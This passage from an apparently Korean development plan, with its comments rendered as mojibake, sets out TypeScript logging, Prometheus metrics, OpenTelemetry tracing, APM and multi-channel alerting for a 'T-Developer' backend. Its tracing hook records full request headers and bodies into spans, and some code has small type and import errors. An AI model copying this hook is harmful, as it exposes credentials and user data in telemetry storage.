  winston.format.colorize({ all: true }),
  winston.format.printf(({ timestamp, level, message, metadata }) => {
    const meta = Object.keys(metadata).length ? JSON.stringify(metadata, null, 2) : '';
    return `${timestamp} [${level}]: ${message} ${meta}`;
  })
);

class Logger {
  private logger: winston.Logger;
  
  constructor(service: string) {
    this.logger = winston.createLogger({
      levels: customLevels.levels,
      defaultMeta: { service },
      transports: this.createTransports()
    });
    
    winston.addColors(customLevels.colors);
  }
  
  private createTransports(): winston.transport[] {
    const transports: winston.transport[] = [];
    
    // ì½˜ì†” ì¶œë ¥
    if (process.env.NODE_ENV !== 'test') {
      transports.push(new winston.transports.Console({
        level: process.env.LOG_LEVEL || 'debug',
        format: process.env.NODE_ENV === 'production' ? logFormat : devFormat
      }));
    }
    
    // íŒŒì¼ ë¡œí…Œì´ì…˜
    if (process.env.NODE_ENV === 'production') {
      // ì—ëŸ¬ ë¡œê·¸
      transports.push(new DailyRotateFile({
        level: 'error',
        filename: 'logs/error-%DATE%.log',
        datePattern: 'YYYY-MM-DD',
        maxSize: '20m',
        maxFiles: '14d',
        format: logFormat
      }));
      
      // ì „ì²´ ë¡œê·¸
      transports.push(new DailyRotateFile({
        filename: 'logs/combined-%DATE%.log',
        datePattern: 'YYYY-MM-DD',
        maxSize: '20m',
        maxFiles: '7d',
        format: logFormat
      }));
    }
    
    // Axiom (í´ë¼ìš°ë“œ ë¡œê¹…)
    if (process.env.AXIOM_TOKEN) {
      transports.push(new AxiomTransport({
        dataset: process.env.AXIOM_DATASET || 't-developer',
        token: process.env.AXIOM_TOKEN
      }));
    }
    
    return transports;
  }
  
  // ë¡œê¹… ë©”ì„œë“œë“¤
  fatal(message: string, meta?: any): void {
    this.logger.log('fatal', message, meta);
  }
  
  error(message: string, error?: Error | any, meta?: any): void {
    this.logger.error(message, { error: error?.stack || error, ...meta });
  }
  
  warn(message: string, meta?: any): void {
    this.logger.warn(message, meta);
  }
  
  info(message: string, meta?: any): void {
    this.logger.info(message, meta);
  }
  
  debug(message: string, meta?: any): void {
    this.logger.debug(message, meta);
  }
  
  trace(message: string, meta?: any): void {
    this.logger.log('trace', message, meta);
  }
  
  // ì„±ëŠ¥ ì¸¡ì • í—¬í¼
  startTimer(): () => void {
    const start = Date.now();
    return () => {
      const duration = Date.now() - start;
      return { duration };
    };
  }
  
  // ì—ì´ì „íŠ¸ ì‹¤í–‰ ë¡œê¹…
  logAgentExecution(agentName: string, projectId: string, result: 'success' | 'failure', meta?: any): void {
    this.info(`Agent execution: ${agentName}`, {
      agentName,
      projectId,
      result,
      ...meta
    });
  }
}

// ì‹±ê¸€í†¤ ì¸ìŠ¤í„´ìŠ¤
export const logger = new Logger('t-developer-backend');

// ìš”ì²­ë³„ ë¡œê±° ìƒì„±
export function createRequestLogger(requestId: string): Logger {
  const requestLogger = new Logger('t-developer-request');
  requestLogger['logger'].defaultMeta = { ...requestLogger['logger'].defaultMeta, requestId };
  return requestLogger;
}
```
---

### SubTask 0.9.2: ë©”íŠ¸ë¦­ ìˆ˜ì§‘ ì‹œìŠ¤í…œ êµ¬í˜„
**ëª©í‘œ**: Prometheus í˜•ì‹ì˜ ë©”íŠ¸ë¦­ ìˆ˜ì§‘ ë° ë…¸ì¶œ

**êµ¬í˜„ ë‚´ìš©**:
```typescript
// backend/src/config/metrics.ts
import promClient from 'prom-client';
import { Request, Response, NextFunction } from 'express';

// Prometheus ë ˆì§€ìŠ¤íŠ¸ë¦¬
const register = new promClient.Registry();

// ê¸°ë³¸ ë©”íŠ¸ë¦­ ìˆ˜ì§‘
promClient.collectDefaultMetrics({ 
  register,
  prefix: 't_developer_'
});

// ì»¤ìŠ¤í…€ ë©”íŠ¸ë¦­ ì •ì˜
export const metrics = {
  // HTTP ìš”ì²­ ê´€ë ¨
  httpRequestDuration: new promClient.Histogram({
    name: 't_developer_http_request_duration_seconds',
    help: 'Duration of HTTP requests in seconds',
    labelNames: ['method', 'route', 'status_code'],
    buckets: [0.1, 0.3, 0.5, 0.7, 1, 3, 5, 7, 10]
  }),
  
  httpRequestTotal: new promClient.Counter({
    name: 't_developer_http_requests_total',
    help: 'Total number of HTTP requests',
    labelNames: ['method', 'route', 'status_code']
  }),
  
  // ì—ì´ì „íŠ¸ ì‹¤í–‰ ê´€ë ¨
  agentExecutionDuration: new promClient.Histogram({
    name: 't_developer_agent_execution_duration_seconds',
    help: 'Duration of agent executions in seconds',
    labelNames: ['agent_name', 'status'],
    buckets: [1, 5, 10, 30, 60, 120, 300, 600]
  }),
  
  agentExecutionTotal: new promClient.Counter({
    name: 't_developer_agent_executions_total',
    help: 'Total number of agent executions',
    labelNames: ['agent_name', 'status']
  }),
  
  agentTokenUsage: new promClient.Counter({
    name: 't_developer_agent_token_usage_total',
    help: 'Total tokens used by agents',
    labelNames: ['agent_name', 'model']
  }),
  
  // í”„ë¡œì íŠ¸ ê´€ë ¨
  projectCreationDuration: new promClient.Histogram({
    name: 't_developer_project_creation_duration_seconds',
    help: 'Duration of project creation in seconds',
    labelNames: ['project_type', 'status'],
    buckets: [10, 30, 60, 120, 300, 600, 1200]
  }),
  
  activeProjects: new promClient.Gauge({
    name: 't_developer_active_projects',
    help: 'Number of currently active projects',
    labelNames: ['status']
  }),
  
  // ì‹œìŠ¤í…œ ë¦¬ì†ŒìŠ¤
  cacheHitRate: new promClient.Gauge({
    name: 't_developer_cache_hit_rate',
    help: 'Cache hit rate percentage',
    labelNames: ['cache_type']
  }),
  
  queueSize: new promClient.Gauge({
    name: 't_developer_queue_size',
    help: 'Current size of job queues',
    labelNames: ['queue_name']
  }),
  
  // ë¹„ì¦ˆë‹ˆìŠ¤ ë©”íŠ¸ë¦­
  componentUsage: new promClient.Counter({
    name: 't_developer_component_usage_total',
    help: 'Total usage of components',
    labelNames: ['component_name', 'version', 'language']
  }),
  
  apiKeyUsage: new promClient.Counter({
    name: 't_developer_api_key_usage_total',
    help: 'API key usage by user',
    labelNames: ['user_id', 'endpoint']
  })
};

// ëª¨ë“  ë©”íŠ¸ë¦­ì„ ë ˆì§€ìŠ¤íŠ¸ë¦¬ì— ë“±ë¡
Object.values(metrics).forEach(metric => register.registerMetric(metric));

// Express ë¯¸ë“¤ì›¨ì–´
export function metricsMiddleware() {
  return (req: Request, res: Response, next: NextFunction) => {
    const start = Date.now();
    
    res.on('finish', () => {
      const duration = (Date.now() - start) / 1000;
      const route = req.route?.path || req.path;
      const labels = {
        method: req.method,
        route,
        status_code: res.statusCode.toString()
      };
      
      metrics.httpRequestDuration.observe(labels, duration);
      metrics.httpRequestTotal.inc(labels);
    });
    
    next();
  };
}

// ë©”íŠ¸ë¦­ ì—”ë“œí¬ì¸íŠ¸
export function metricsEndpoint() {
  return async (req: Request, res: Response) => {
    res.set('Content-Type', register.contentType);
    const metrics = await register.metrics();
    res.end(metrics);
  };
}

// ë©”íŠ¸ë¦­ í—¬í¼ í´ë˜ìŠ¤
export class MetricsHelper {
  // ì—ì´ì „íŠ¸ ì‹¤í–‰ ë©”íŠ¸ë¦­ ê¸°ë¡
  static recordAgentExecution(
    agentName: string, 
    duration: number, 
    status: 'success' | 'failure',
    tokensUsed?: number,
    model?: string
  ): void {
    metrics.agentExecutionDuration.observe({ agent_name: agentName, status }, duration);
    metrics.agentExecutionTotal.inc({ agent_name: agentName, status });
    
    if (tokensUsed && model) {
      metrics.agentTokenUsage.inc({ agent_name: agentName, model }, tokensUsed);
    }
  }
  
  // í”„ë¡œì íŠ¸ ìƒì„± ë©”íŠ¸ë¦­ ê¸°ë¡
  static recordProjectCreation(
    projectType: string,
    duration: number,
    status: 'success' | 'failure'
  ): void {
    metrics.projectCreationDuration.observe({ project_type: projectType, status }, duration);
  }
  
  // ìºì‹œ íˆíŠ¸ìœ¨ ì—…ë°ì´íŠ¸
  static updateCacheHitRate(cacheType: string, hitRate: number): void {
    metrics.cacheHitRate.set({ cache_type: cacheType }, hitRate);
  }
  
  // í í¬ê¸° ì—…ë°ì´íŠ¸
  static updateQueueSize(queueName: string, size: number): void {
    metrics.queueSize.set({ queue_name: queueName }, size);
  }
  
  // í™œì„± í”„ë¡œì íŠ¸ ìˆ˜ ì—…ë°ì´íŠ¸
  static updateActiveProjects(counts: Record<string, number>): void {
    Object.entries(counts).forEach(([status, count]) => {
      metrics.activeProjects.set({ status }, count);
    });
  }
}
```

### SubTask 0.9.3: ë¶„ì‚° ì¶”ì  ì‹œìŠ¤í…œ ì„¤ì •
**ëª©í‘œ**: OpenTelemetryë¥¼ ì´ìš©í•œ ë¶„ì‚° ì¶”ì 

**êµ¬í˜„ ë‚´ìš©**:
```typescript
// backend/src/config/tracing.ts
import { NodeTracerProvider } from '@opentelemetry/sdk-trace-node';
import { Resource } from '@opentelemetry/resources';
import { SemanticResourceAttributes } from '@opentelemetry/semantic-conventions';
import { JaegerExporter } from '@opentelemetry/exporter-jaeger';
import { BatchSpanProcessor } from '@opentelemetry/sdk-trace-base';
import { registerInstrumentations } from '@opentelemetry/instrumentation';
import { HttpInstrumentation } from '@opentelemetry/instrumentation-http';
import { ExpressInstrumentation } from '@opentelemetry/instrumentation-express';
import { AwsInstrumentation } from '@opentelemetry/instrumentation-aws-sdk';
import { RedisInstrumentation } from '@opentelemetry/instrumentation-redis';
import { trace, context, SpanStatusCode } from '@opentelemetry/api';

// íŠ¸ë ˆì´ì„œ í”„ë¡œë°”ì´ë” ìƒì„±
const provider = new NodeTracerProvider({
  resource: new Resource({
    [SemanticResourceAttributes.SERVICE_NAME]: 't-developer',
    [SemanticResourceAttributes.SERVICE_VERSION]: process.env.npm_package_version || '1.0.0',
    [SemanticResourceAttributes.DEPLOYMENT_ENVIRONMENT]: process.env.NODE_ENV || 'development'
  })
});

// Jaeger ìµìŠ¤í¬í„° ì„¤ì •
const jaegerExporter = new JaegerExporter({
  endpoint: process.env.JAEGER_ENDPOINT || 'http://localhost:14268/api/traces',
  serviceName: 't-developer'
});

// ë°°ì¹˜ í”„ë¡œì„¸ì„œ ì¶”ê°€
provider.addSpanProcessor(new BatchSpanProcessor(jaegerExporter));

// í”„ë¡œë°”ì´ë” ë“±ë¡
provider.register();

// ìë™ ê³„ì¸¡ ì„¤ì •
registerInstrumentations({
  instrumentations: [
    new HttpInstrumentation({
      requestHook: (span, request) => {
        span.setAttributes({
          'http.request.body': JSON.stringify(request.body),
          'http.request.headers': JSON.stringify(request.headers)
        });
      }
    }),
    new ExpressInstrumentation(),
    new AwsInstrumentation({
      suppressInternalInstrumentation: true
    }),
    new RedisInstrumentation()
  ]
});

// íŠ¸ë ˆì´ì„œ ì¸ìŠ¤í„´ìŠ¤
export const tracer = trace.getTracer('t-developer', '1.0.0');

// ì»¤ìŠ¤í…€ ìŠ¤íŒ¬ ìƒì„± í—¬í¼
export class TracingHelper {
  // ì—ì´ì „íŠ¸ ì‹¤í–‰ ì¶”ì 
  static async traceAgentExecution<T>(
    agentName: string,
    projectId: string,
    operation: () => Promise<T>
  ): Promise<T> {
    return tracer.startActiveSpan(`agent.${agentName}.execute`, async (span) => {
      span.setAttributes({
        'agent.name': agentName,
        'project.id': projectId,
        'agent.start_time': new Date().toISOString()
      });
      
      try {
        const result = await operation();
        span.setStatus({ code: SpanStatusCode.OK });
        span.setAttributes({
          'agent.success': true,
          'agent.end_time': new Date().toISOString()
        });
        return result;
      } catch (error) {
        span.recordException(error as Error);
        span.setStatus({
          code: SpanStatusCode.ERROR,
          message: error instanceof Error ? error.message : 'Unknown error'
        });
        throw error;
      } finally {
        span.end();
      }
    });
  }
  
  // ì™¸ë¶€ API í˜¸ì¶œ ì¶”ì 
  static async traceExternalCall<T>(
    serviceName: string,
    endpoint: string,
    operation: () => Promise<T>
  ): Promise<T> {
    return tracer.startActiveSpan(`external.${serviceName}`, async (span) => {
      span.setAttributes({
        'external.service': serviceName,
        'external.endpoint': endpoint,
        'external.timestamp': new Date().toISOString()
      });
      
      try {
        const result = await operation();
        span.setStatus({ code: SpanStatusCode.OK });
        return result;
      } catch (error) {
        span.recordException(error as Error);
        span.setStatus({
          code: SpanStatusCode.ERROR,
          message: error instanceof Error ? error.message : 'Unknown error'
        });
        throw error;
      } finally {
        span.end();
      }
    });
  }
  
  // ë°ì´í„°ë² ì´ìŠ¤ ì‘ì—… ì¶”ì 
  static async traceDatabaseOperation<T>(
    operation: string,
    table: string,
    query: () => Promise<T>
  ): Promise<T> {
    return tracer.startActiveSpan(`db.${operation}`, async (span) => {
      span.setAttributes({
        'db.operation': operation,
        'db.table': table,
        'db.system': 'dynamodb'
      });
      
      const startTime = Date.now();
      
      try {
        const result = await query();
        const duration = Date.now() - startTime;
        
        span.setAttributes({
          'db.duration_ms': duration,
          'db.success': true
        });
        span.setStatus({ code: SpanStatusCode.OK });
        
        return result;
      } catch (error) {
        span.recordException(error as Error);
        span.setStatus({
          code: SpanStatusCode.ERROR,
          message: error instanceof Error ? error.message : 'Unknown error'
        });
        throw error;
      } finally {
        span.end();
      }
    });
  }
  
  // ë°°ì¹˜ ì‘ì—… ì¶”ì 
  static createBatchSpan(operationName: string, batchSize: number) {
    const span = tracer.startSpan(`batch.${operationName}`);
    span.setAttributes({
      'batch.size': batchSize,
      'batch.start_time': new Date().toISOString()
    });
    
    return {
      recordItem: (index: number, success: boolean) => {
        span.addEvent(`item_processed`, {
          'item.index': index,
          'item.success': success
        });
      },
      end: (successCount: number) => {
        span.setAttributes({
          'batch.success_count': successCount,
          'batch.failure_count': batchSize - successCount,
          'batch.end_time': new Date().toISOString()
        });
        span.end();
      }
    };
  }
}

// ì»¨í…ìŠ¤íŠ¸ ì „íŒŒ ë¯¸ë“¤ì›¨ì–´
export function tracingMiddleware() {
  return (req: Request, res: Response, next: NextFunction) => {
    const span = tracer.startSpan(`http ${req.method} ${req.path}`);
    
    context.with(trace.setSpan(context.active(), span), () => {
      // ìš”ì²­ IDë¥¼ ìŠ¤íŒ¬ì— ì¶”ê°€
      span.setAttributes({
        'http.request_id': req.id,
        'http.user_agent': req.headers['user-agent'] || 'unknown'
      });
      
      // ì‘ë‹µ ì™„ë£Œ ì‹œ ìŠ¤íŒ¬ ì¢…ë£Œ
      res.on('finish', () => {
        span.setAttributes({
          'http.status_code': res.statusCode,
          'http.response_size': res.get('content-length') || 0
        });
        span.setStatus({
          code: res.statusCode >= 400 ? SpanStatusCode.ERROR : SpanStatusCode.OK
        });
        span.end();
      });
      
      next();
    });
  };
}
```

### SubTask 0.9.4: ì• í”Œë¦¬ì¼€ì´ì…˜ ì„±ëŠ¥ ëª¨ë‹ˆí„°ë§ (APM)
**ëª©í‘œ**: ì‹¤ì‹œê°„ ì„±ëŠ¥ ëª¨ë‹ˆí„°ë§ ë° ì•Œë¦¼ ì‹œìŠ¤í…œ

**êµ¬í˜„ ë‚´ìš©**:
```typescript
// backend/src/monitoring/apm.ts
import { EventEmitter } from 'events';
import os from 'os';
import v8 from 'v8';

interface PerformanceMetrics {
  cpu: {
    usage: number;
    loadAverage: number[];
  };
  memory: {
    heapUsed: number;
    heapTotal: number;
    external: number;
    rss: number;
  };
  eventLoop: {
    delay: number;
    utilization: number;
  };
  gc: {
    count: number;
    duration: number;
    type: string;
  }[];
}

export class APMService extends EventEmitter {
  private metrics: PerformanceMetrics;
  private thresholds = {
    cpu: { warning: 70, critical: 90 },
    memory: { warning: 80, critical: 95 },
    eventLoopDelay: { warning: 100, critical: 500 }
  };
  private monitoringInterval: NodeJS.Timer | null = null;
  
  constructor() {
    super();
    this.initializeMetrics();
  }
  
  private initializeMetrics(): void {
    this.metrics = {
      cpu: { usage: 0, loadAverage: [0, 0, 0] },
      memory: { heapUsed: 0, heapTotal: 0, external: 0, rss: 0 },
      eventLoop: { delay: 0, utilization: 0 },
      gc: []
    };
  }
  
  start(intervalMs: number = 5000): void {
    if (this.monitoringInterval) {
      return;
    }
    
    // GC ëª¨ë‹ˆí„°ë§ í™œì„±í™”
    if (global.gc) {
      const performanceObserver = new PerformanceObserver((list) => {
        const entries = list.getEntries();
        entries.forEach((entry) => {
          if (entry.entryType === 'gc') {
            this.metrics.gc.push({
              count: 1,
              duration: entry.duration,
              type: entry.detail?.kind || 'unknown'
            });
          }
        });
      });
      performanceObserver.observe({ entryTypes: ['gc'] });
    }
    
    // ì£¼ê¸°ì  ë©”íŠ¸ë¦­ ìˆ˜ì§‘
    this.monitoringInterval = setInterval(() => {
      this.collectMetrics();
      this.checkThresholds();
      this.emit('metrics', this.metrics);
    }, intervalMs);
    
    // Event Loop ì§€ì—° ì¸¡ì •
    this.measureEventLoopDelay();
  }
  
  stop(): void {
    if (this.monitoringInterval) {
      clearInterval(this.monitoringInterval);
      this.monitoringInterval = null;
    }
  }
  
  private collectMetrics(): void {
    // CPU ë©”íŠ¸ë¦­
    const cpus = os.cpus();
    const cpuUsage = cpus.reduce((acc, cpu) => {
      const total = Object.values(cpu.times).reduce((a, b) => a + b, 0);
      const idle = cpu.times.idle;
      return acc + ((total - idle) / total) * 100;
    }, 0) / cpus.length;
    
    this.metrics.cpu = {
      usage: Math.round(cpuUsage),
      loadAverage: os.loadavg()
    };
    
    // ë©”ëª¨ë¦¬ ë©”íŠ¸ë¦­
    const memUsage = process.memoryUsage();
    this.metrics.memory = {
      heapUsed: memUsage.heapUsed,
      heapTotal: memUsage.heapTotal,
      external: memUsage.external,
      rss: memUsage.rss
    };
    
    // V8 í™ í†µê³„
    const heapStats = v8.getHeapStatistics();
    const heapUsedPercent = (heapStats.used_heap_size / heapStats.heap_size_limit) * 100;
    
    // ë©”ëª¨ë¦¬ ì‚¬ìš©ë¥  ê³„ì‚°
    if (heapUsedPercent > this.thresholds.memory.critical) {
      this.emit('alert', {
        level: 'critical',
        type: 'memory',
        message: `Memory usage critical: ${heapUsedPercent.toFixed(2)}%`,
        value: heapUsedPercent
      });
    }
  }
  
  private measureEventLoopDelay(): void {
    let lastCheck = process.hrtime.bigint();
    
    setImmediate(() => {
      const delay = Number(process.hrtime.bigint() - lastCheck) / 1e6; // Convert to ms
      this.metrics.eventLoop.delay = delay;
      
      if (delay > this.thresholds.eventLoopDelay.critical) {
        this.emit('alert', {
          level: 'critical',
          type: 'eventLoop',
          message: `Event loop delay critical: ${delay.toFixed(2)}ms`,
          value: delay
        });
      }
      
      // ì¬ê·€ì ìœ¼ë¡œ ê³„ì† ì¸¡ì •
      if (this.monitoringInterval) {
        this.measureEventLoopDelay();
      }
    });
  }
  
  private checkThresholds(): void {
    // CPU ì„ê³„ê°’ í™•ì¸
    if (this.metrics.cpu.usage > this.thresholds.cpu.critical) {
      this.emit('alert', {
        level: 'critical',
        type: 'cpu',
        message: `CPU usage critical: ${this.metrics.cpu.usage}%`,
        value: this.metrics.cpu.usage
      });
    } else if (this.metrics.cpu.usage > this.thresholds.cpu.warning) {
      this.emit('alert', {
        level: 'warning',
        type: 'cpu',
        message: `CPU usage warning: ${this.metrics.cpu.usage}%`,
        value: this.metrics.cpu.usage
      });
    }
  }
  
  getMetrics(): PerformanceMetrics {
    return { ...this.metrics };
  }
  
  getHealthStatus(): { healthy: boolean; issues: string[] } {
    const issues: string[] = [];
    
    if (this.metrics.cpu.usage > this.thresholds.cpu.warning) {
      issues.push(`High CPU usage: ${this.metrics.cpu.usage}%`);
    }
    
    const heapUsedPercent = (this.metrics.memory.heapUsed / this.metrics.memory.heapTotal) * 100;
    if (heapUsedPercent > this.thresholds.memory.warning) {
      issues.push(`High memory usage: ${heapUsedPercent.toFixed(2)}%`);
    }
    
    if (this.metrics.eventLoop.delay > this.thresholds.eventLoopDelay.warning) {
      issues.push(`High event loop delay: ${this.metrics.eventLoop.delay.toFixed(2)}ms`);
    }
    
    return {
      healthy: issues.length === 0,
      issues
    };
  }
}

// APM ì„œë¹„ìŠ¤ ì¸ìŠ¤í„´ìŠ¤
export const apmService = new APMService();

// Express ì—”ë“œí¬ì¸íŠ¸
export function apmEndpoints(app: Express): void {
  // ì‹¤ì‹œê°„ ë©”íŠ¸ë¦­
  app.get('/api/monitoring/metrics', (req, res) => {
    res.json(apmService.getMetrics());
  });
  
  // í—¬ìŠ¤ ì²´í¬
  app.get('/api/monitoring/health', (req, res) => {
    const health = apmService.getHealthStatus();
    res.status(health.healthy ? 200 : 503).json(health);
  });
  
  // ë©”íŠ¸ë¦­ ìŠ¤íŠ¸ë¦¬ë° (SSE)
  app.get('/api/monitoring/stream', (req, res) => {
    res.writeHead(200, {
      'Content-Type': 'text/event-stream',
      'Cache-Control': 'no-cache',
      'Connection': 'keep-alive'
    });
    
    const sendMetrics = (metrics: PerformanceMetrics) => {
      res.write(`data: ${JSON.stringify(metrics)}\n\n`);
    };
    
    apmService.on('metrics', sendMetrics);
    
    req.on('close', () => {
      apmService.removeListener('metrics', sendMetrics);
    });
  });
}
```

### SubTask 0.9.5: ì•Œë¦¼ ë° ì—ìŠ¤ì»¬ë ˆì´ì…˜ ì‹œìŠ¤í…œ
**ëª©í‘œ**: ë‹¤ì–‘í•œ ì±„ë„ì„ í†µí•œ ì•Œë¦¼ ì‹œìŠ¤í…œ êµ¬ì¶•

**êµ¬í˜„ ë‚´ìš©**:
```typescript
// backend/src/monitoring/alerting.ts
import nodemailer from 'nodemailer';
import { WebClient } from '@slack/web-api';
import twilio from 'twilio';
import { logger } from '../config/logger';

interface Alert {
  id: string;
  level: 'info' | 'warning' | 'critical' | 'emergency';
  type: string;
  title: string;
  message: string;
  metadata?: Record<string, any>;
  timestamp: Date;
}

interface AlertChannel {
  send(alert: Alert): Promise<void>;
}

// ì´ë©”ì¼ ì•Œë¦¼ ì±„ë„
class EmailAlertChannel implements AlertChannel {
  private transporter: nodemailer.Transporter;
  
  constructor() {
    this.transporter = nodemailer.createTransport({
      host: process.env.SMTP_HOST,
      port: parseInt(process.env.SMTP_PORT || '587'),
      secure: process.env.SMTP_SECURE === 'true',
      auth: {
        user: process.env.SMTP_USER,
        pass: process.env.SMTP_PASS
      }
    });
  }
  
  async send(alert: Alert): Promise<void> {
    const levelColors = {
      info: '#0066cc',
      warning: '#ff9900',
      critical: '#ff0000',
      emergency: '#660000'
    };
    
    const html = `
      <div style="font-family: Arial, sans-serif; max-width: 600px;">
        <div style="background-color: ${levelColors[alert.level]}; color: white; padding: 20px;">
          <h2 style="margin: 0;">T-Developer Alert: ${alert.title}</h2>
        </div>
        <div style="padding: 20px; background-color: #f5f5f5;">
          <p><strong>Level:</strong> ${alert.level.toUpperCase()}</p>
          <p><strong>Type:</strong> ${alert.type}</p>
          <p><strong>Time:</strong> ${alert.timestamp.toISOString()}</p>
          <p><strong>Message:</strong></p>
          <p style="background-color: white; padding: 15px; border-left: 4px solid ${levelColors[alert.level]};">
            ${alert.message}
          </p>
          ${alert.metadata ? `
            <p><strong>Additional Details:</strong></p>
            <pre style="background-color: white; padding: 15px; overflow-x: auto;">
${JSON.stringify(alert.metadata, null, 2)}
            </pre>
          ` : ''}
        </div>
      </div>
    `;
    
    await this.transporter.sendMail({
      from: process.env.ALERT_FROM_EMAIL,
      to: process.env.ALERT_TO_EMAILS?.split(','),
      subject: `[${alert.level.toUpperCase()}] T-Developer: ${alert.title}`,
      html
    });
  }
}

// Slack ì•Œë¦¼ ì±„ë„
class SlackAlertChannel implements AlertChannel {
  private client: WebClient;
  private channel: string;
  
  constructor() {
    this.client = new WebClient(process.env.SLACK_BOT_TOKEN);
    this.channel = process.env.SLACK_ALERT_CHANNEL || '#alerts';
  }
  
  async send(alert: Alert): Promise<void> {
    const levelEmojis = {
      info: ':information_source:',
      warning: ':warning:',
      critical: ':rotating_light:',
      emergency: ':fire:'
    };
    
    const levelColors = {
      info: '#0066cc',
      warning: '#ff9900',
      critical: '#ff0000',
      emergency: '#660000'
    };
    
    await this.client.chat.postMessage({
      channel: this.channel,
      attachments: [{
        color: levelColors[alert.level],
        title: `${levelEmojis[alert.level]} ${alert.title}`,
        text: alert.message,
        fields: [
          {
            title: 'Level',
            value: alert.level.toUpperCase(),
            short: true
          },
          {
            title: 'Type',
            value: alert.type,
            short: true
          }
        ],
        footer: 'T-Developer Monitoring',
        ts: Math.floor(alert.timestamp.getTime() / 1000).toString()
      }]
    });
  }
}

// SMS ì•Œë¦¼ ì±„ë„ (ê¸´ê¸‰ ì•Œë¦¼ìš©)
class SMSAlertChannel implements AlertChannel {
  private client: twilio.Twilio;
  
  constructor() {
    this.client = twilio(
      process.env.TWILIO_ACCOUNT_SID,
      process.env.TWILIO_AUTH_TOKEN
    );
  }
  
  async send(alert: Alert): Promise<void> {
    // ê¸´ê¸‰ ì•Œë¦¼ë§Œ SMSë¡œ ì „ì†¡
    if (alert.level !== 'critical' && alert.level !== 'emergency') {
      return;
    }
    
    const recipients = process.env.SMS_ALERT_NUMBERS?.split(',') || [];
    
    for (const to of recipients) {
      await this.client.messages.create({
        body: `T-Developer ${alert.level.toUpperCase()}: ${alert.title}\n${alert.message}`,
        from: process.env.TWILIO_PHONE_NUMBER,
        to
      });
    }
  }
}

// ì•Œë¦¼ ê´€ë¦¬ì
export class AlertManager {
  private channels: Map<string, AlertChannel> = new Map();
  private alertHistory: Alert[] = [];
  private alertCooldowns: Map<string, number> = new Map();
  
  constructor() {
    this.initializeChannels();
  }
  
  private initializeChannels(): void {
    if (process.env.SMTP_HOST) {
      this.channels.set('email', new EmailAlertChannel());
    }
    
    if (process.env.SLACK_BOT_TOKEN) {
      this.channels.set('slack', new SlackAlertChannel());
    }
    
    if (process.env.TWILIO_ACCOUNT_SID) {
      this.channels.set('sms', new SMSAlertChannel());
    }
  }
  
  async sendAlert(alert: Omit<Alert, 'id' | 'timestamp'>): Promise<void> {
    const fullAlert: Alert = {
      ...alert,
      id: `alert_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
      timestamp: new Date()
    };
    
    // ì¤‘ë³µ ì•Œë¦¼ ë°©ì§€ (ì¿¨ë‹¤ìš´)
    const cooldownKey = `${alert.type}:${alert.level}`;
    const lastAlert = this.alertCooldowns.get(cooldownKey);
    
    if (lastAlert && Date.now() - lastAlert < 300000) { // 5ë¶„ ì¿¨ë‹¤ìš´
      logger.debug('Alert suppressed due to cooldown', { cooldownKey });
      return;
    }
    
    // ì•Œë¦¼ ê¸°ë¡
    this.alertHistory.push(fullAlert);
    this.alertCooldowns.set(cooldownKey, Date.now());
    
    // ë¡œê·¸ ê¸°ë¡
    logger.warn('Alert triggered', fullAlert);
    
    // ë ˆë²¨ì— ë”°ë¥¸ ì±„ë„ ì„ íƒ
    const channelsToUse = this.selectChannels(fullAlert.level);
    
    // ë³‘ë ¬ë¡œ ì•Œë¦¼ ì „ì†¡
    const sendPromises = channelsToUse.map(channelName => {
      const channel = this.channels.get(channelName);
      if (channel) {
        return channel.send(fullAlert).catch(error => {
          logger.error(`Failed to send alert via ${channelName}`, error);
        });
      }
    });
    
    await Promise.all(sendPromises);
  }
  
  private selectChannels(level: Alert['level']): string[] {
    switch (level) {
      case 'info':
        return ['slack'];
      case 'warning':
        return ['slack', 'email'];
      case 'critical':
        return ['slack', 'email', 'sms'];
      case 'emergency':
        return ['slack', 'email', 'sms'];
      default:
        return ['slack'];
    }
  }
  
  getRecentAlerts(limit: number = 50): Alert[] {
    return this.alertHistory
      .slice(-limit)
      .sort((a, b) => b.timestamp.getTime() - a.timestamp.getTime());
  }
  
  clearAlertHistory(): void {
    this.alertHistory = [];
    this.alertCooldowns.clear();
  }
}

// ì•Œë¦¼ ê´€ë¦¬ì ì¸ìŠ¤í„´ìŠ¤
export const alertManager = new AlertManager();

// ì‚¬ì „ ì •ì˜ëœ ì•Œë¦¼ í…œí”Œë¦¿
export const alertTemplates = {
  highCPU: (usage: number) => ({
    level: usage > 90 ? 'critical' as const : 'warning' as const,
    type: 'performance',
    title: 'High CPU Usage Detected',
    message: `CPU usage is at ${usage}%. This may impact system performance.`,
    metadata: { cpuUsage: usage }
  }),
  
  highMemory: (usage: number) => ({
    level: usage > 95 ? 'critical' as const : 'warning' as const,
    type: 'performance',
    title: 'High Memory Usage Detected',
    message: `Memory usage is at ${usage}%. Consider scaling or optimizing memory usage.`,
    metadata: { memoryUsage: usage }
  }),
  
  agentFailure: (agentName: string, error: string) => ({
    level: 'critical' as const,
    type: 'agent',
    title: `Agent Failure: ${agentName}`,
    message: `Agent ${agentName} has failed with error: ${error}`,
    metadata: { agentName, error }
  }),
  
  projectCreationFailure: (projectId: string, error: string) => ({
    level: 'warning' as const,
    type: 'project',
    title: 'Project Creation Failed',
    message: `Failed to create project ${projectId}: ${error}`,
    metadata: { projectId, error }
  })
};
```

**ğŸ”§ ì‚¬ìš©ì ì‘ì—…**:
- ëª¨ë‹ˆí„°ë§ ëŒ€ì‹œë³´ë“œ URL ì ‘ì† í™•ì¸
- Prometheus ë©”íŠ¸ë¦­ ìˆ˜ì§‘ í™•ì¸: http://localhost:8000/metrics
- Jaeger UI ì ‘ì† í™•ì¸: http://localhost:16686
- ì•Œë¦¼ ì±„ë„ í™˜ê²½ ë³€ìˆ˜ ì„¤ì • (Slack, Email ë“±)

---

## ğŸ“‹ Phase 0 ì™„ë£Œ ì²´í¬ë¦¬ìŠ¤íŠ¸

### âœ… ì™„ë£Œëœ ì‘ì—…
- [x] ê°œë°œ í™˜ê²½ ì´ˆê¸° ì„¤ì • (Task 0.1)
- [x] AWS ë¦¬ì†ŒìŠ¤ ì´ˆê¸° ì„¤ì • (Task 0.2)
- [x] í”„ë¡œì íŠ¸ ì˜ì¡´ì„± ì„¤ì¹˜ (Task 0.3)
- [x] ë³´ì•ˆ ë° ì¸ì¦ ê¸°ì´ˆ ì„¤ì • (Task 0.4)
- [x] í…ŒìŠ¤íŠ¸ í™˜ê²½ êµ¬ì¶• (Task 0.5)
- [x] ë¡œì»¬ ê°œë°œ ì¸í”„ë¼ êµ¬ì„± (Task 0.6)
